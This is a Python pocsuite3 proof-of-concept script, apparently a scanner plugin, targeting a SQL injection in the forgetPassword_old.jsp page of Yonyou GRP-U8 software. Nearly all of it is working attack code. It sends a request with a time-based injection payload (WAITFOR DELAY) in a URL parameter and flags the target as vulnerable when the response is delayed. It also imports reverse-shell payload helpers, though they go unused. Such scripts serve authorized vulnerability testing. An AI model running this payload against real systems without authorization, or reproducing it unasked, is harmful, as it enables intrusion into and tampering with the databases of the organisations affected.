# _*_ coding:utf-8 _*_
# @Time : 2024/1/31
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class yongyouU8_forgetpassword_oldjsp_sql(POCBase):
    pocDesc = '''用友GRP-U8 forgetPassword_old.jspSQL注入'''
    author = '炼金术师诸葛亮'
    createDate = '2024-1-31'
    name = '用友GRP-U8 forgetPassword_old.jspSQL注入漏洞'
    #app="用友-GRP-U8"


    def _verify(self):

        result = {}
        url = self.url+ '/u8qx/forgetPassword_old.jsp?action=save&idCard=1&userName=1&inputDW=1&inputYWRQ=1%27;WAITFOR%20DELAY%20%270:0:5%27--'
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
            'Accept-Encoding': 'gzip'
        }
        try:


            response = requests.get(url, headers=headers)
            if response.status_code == 200 and response.elapsed.total_seconds() >= 5:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(yongyouU8_forgetpassword_oldjsp_sql)
